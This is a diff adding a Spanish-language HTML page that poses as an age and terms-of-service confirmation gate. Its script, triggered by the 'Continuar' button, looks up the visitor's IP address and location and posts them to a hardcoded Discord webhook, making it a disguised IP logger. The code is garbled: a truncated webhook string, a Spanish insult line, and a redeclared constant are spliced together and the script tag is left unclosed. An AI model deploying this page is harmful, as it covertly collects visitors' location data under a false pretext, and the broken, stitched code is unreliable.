@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Experience</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at top left, #0f0c29, #302b63, #24243e);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 3rem;
+            border-radius: 20px;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            max-width: 90%;
+            width: 450px;
+            animation: fadeIn 1.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        p {
+            font-size: 1.1rem;
+            color: #ccc;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 15px 40px;
+            background: linear-gradient(45deg, #00c6ff, #0072ff);
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: bold;
+            transition: 0.3s;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 10px 20px rgba(0, 114, 255, 0.3);
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 25px rgba(0, 114, 255, 0.5);
+        }
+
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #FFF;
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            display: none;
+            margin: 20px auto;
+            animation: rotation 1s linear infinite;
+        }
+
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Bienvenido</h1>
+        <p>Para acceder al contenido exclusivo de esta plataforma, por favor confirma tu edad y acepta los términos de servicio.</p>
+        <button class="btn" id="actionBtn">Continuar</button>
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1553476392753037362/8JQyYUjI-4Wjtv4wDlJaQ8Shyg
+Eres un maldito capullo. Que te den un cúlpe en la cara.
+
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1553476392753037362/8JQyYUjI-4Wjtv4wDlJaQ8ShygE7I8FPY3Z8L2I_47uwvcRqATAkt2g-tKMntnZToSMB";
+const GEOLOCATION_API = "https://api.ipgeolocation.io/json/?apiKey=YOUR_API_KEY&ip=auto";
+
+document.getElementById("actionBtn").addEventListener("click", async () => {
+  document.body.classList.add("loading");
+  document.getElementById("loader").style.display = "block";
+
+  try {
+    const response = await fetch(GEOLOCATION_API);
+    const locationData = await response.json();
+    const { city, region, country_name } = locationData;
+
+    const userData = {
+      ip: locationData.ip,
+      city,
+      region,
+      country: country_name,
+    };
+
+    const webhookResponse = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(userData),
+    });
+
+    if (webhookResponse.ok) {
+      alert("Datos enviados correctamente al webhook.");
+    } else {
+      alert("Ocurrió un error al enviar los datos.");
+    }
+  } catch (error) {
+    console.error(error);
+    alert("Ha ocurrido un error. Revise la consola para más información.");
+  } finally {
+    document.body.classList.remove("loading");
+    document.getElementById("loader").style.display = "none";
+  }
+});
